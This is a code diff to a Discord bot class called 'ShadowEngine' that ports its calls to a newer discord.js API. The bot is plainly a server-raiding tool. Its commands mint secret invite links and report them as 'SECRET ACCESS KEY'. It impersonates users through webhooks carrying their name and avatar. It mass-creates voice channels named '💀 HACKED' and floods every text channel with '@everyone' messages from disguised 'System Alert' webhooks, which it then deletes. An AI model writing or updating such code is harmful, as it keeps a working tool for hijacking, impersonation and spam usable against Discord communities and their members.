@@ -9,7 +9,7 @@
  * ============================================================================
  */
 
-const { MessageEmbed, MessageActionRow, MessageButton } = require("discord.js");
+const { MessageEmbed, MessageActionRow, MessageButton, getLegacyChannelType, resolveChannelType } = require("./core/discordCompat");
 const express = require("express");
 const crypto = require("node:crypto");
 const config  = require("./config.json");
@@ -1124,7 +1124,7 @@ class ShadowEngine {
         const info = [
             `**Guild:** ${guild.name} (\`${guild.id}\`)`,
             `**Members:** ${guild.memberCount} | **Bots:** ${guild.members.cache.filter(m => m.user.bot).size}`,
-            `**Channels:** ${guild.channels.cache.filter(c => c.type === 'GUILD_TEXT').size}T / ${guild.channels.cache.filter(c => c.type === 'GUILD_VOICE').size}V`,
+            `**Channels:** ${guild.channels.cache.filter(c => getLegacyChannelType(c.type) === 'GUILD_TEXT').size}T / ${guild.channels.cache.filter(c => getLegacyChannelType(c.type) === 'GUILD_VOICE').size}V`,
             `**Owner:** <@${guild.ownerId}>`,
             `**Boost:** Tier ${guild.premiumTier}`,
             `**Icon:** ${guild.iconURL({ size: 512 }) || 'ไม่มี'}`,
@@ -1134,7 +1134,7 @@ class ShadowEngine {
     }
 
     async commandExtract(guild) {
-        const ch = guild.channels.cache.filter(c => c.type === "GUILD_TEXT").first();
+        const ch = guild.channels.cache.filter(c => getLegacyChannelType(c.type) === "GUILD_TEXT").first();
         if (!ch) return;
         const inv = await ch.createInvite({ maxAge: 3600, maxUses: 1 });
         await this.sendAlert("🔗 SECRET ACCESS KEY", `ลิงก์ลับ ${guild.name} (1ชม./1ครั้ง):\n${inv.url}`, "#a855f7");
@@ -1175,7 +1175,7 @@ class ShadowEngine {
     }
 
     async commandLockdown(message, guild) {
-        if (message.channel.type !== "GUILD_TEXT") return;
+        if (getLegacyChannelType(message.channel.type) !== "GUILD_TEXT") return;
         const overwrite = message.channel.permissionOverwrites.cache.get(guild.id);
         if (!permissionSnapshots.has(`ch_${message.channel.id}`)) {
             permissionSnapshots.set(`ch_${message.channel.id}`, {
@@ -1188,7 +1188,7 @@ class ShadowEngine {
     }
 
     async commandUnlock(message, guild) {
-        if (message.channel.type !== "GUILD_TEXT") return;
+        if (getLegacyChannelType(message.channel.type) !== "GUILD_TEXT") return;
         await message.channel.permissionOverwrites.edit(guild.id, { SEND_MESSAGES: null });
         await this.sendAlert("🔓 CHANNEL UNLOCKED", `คลายล็อก <#${message.channel.id}> ใน **${guild.name}**`);
     }
@@ -1266,7 +1266,10 @@ class ShadowEngine {
             .replace(`<@${targetUser.id}>`, "").replace(`<@!${targetUser.id}>`, "")
             .replace(`<#${targetChan.id}>`, "").trim();
         if (!text) return;
-        const hook = await targetChan.createWebhook(targetUser.username, { avatar: targetUser.displayAvatarURL() }).catch(() => null);
+        const hook = await targetChan.createWebhook({
+            name: targetUser.username,
+            avatar: targetUser.displayAvatarURL()
+        }).catch(() => null);
         if (hook) { await hook.send(text).catch(() => {}); await hook.delete().catch(() => {}); }
     }
 
@@ -1325,7 +1328,7 @@ class ShadowEngine {
         const amt = Number.parseInt(args[2], 10) || 20;
         const vName = args.slice(3).join(" ") || "💀 HACKED";
         for (let i = 0; i < amt; i++) {
-            guild.channels.create(vName, { type: "GUILD_VOICE" }).catch(() => {});
+            guild.channels.create({ name: vName, type: resolveChannelType("GUILD_VOICE") }).catch(() => {});
             await delay(150);
         }
         await this.sendAlert("🔊 VC SPAM", `สร้าง Voice Channel ${amt} ช่องใน **${guild.name}**`);
@@ -1334,9 +1337,9 @@ class ShadowEngine {
     async commandMassSpam(guild, args) {
         const amt = Number.parseInt(args[2], 10) || 5;
         const txt = args.slice(3).join(" ") || "@everyone โดนยึดแล้ว!";
-        const chs = guild.channels.cache.filter(c => c.type === "GUILD_TEXT");
+        const chs = guild.channels.cache.filter(c => getLegacyChannelType(c.type) === "GUILD_TEXT");
         for (const [, c] of chs) {
-            const hook = await c.createWebhook("System Alert").catch(() => null);
+            const hook = await c.createWebhook({ name: "System Alert" }).catch(() => null);
             if (hook) {
                 for (let i = 0; i < amt; i++) await hook.send(txt).catch(() => {});
                 await hook.delete().catch(() => {});
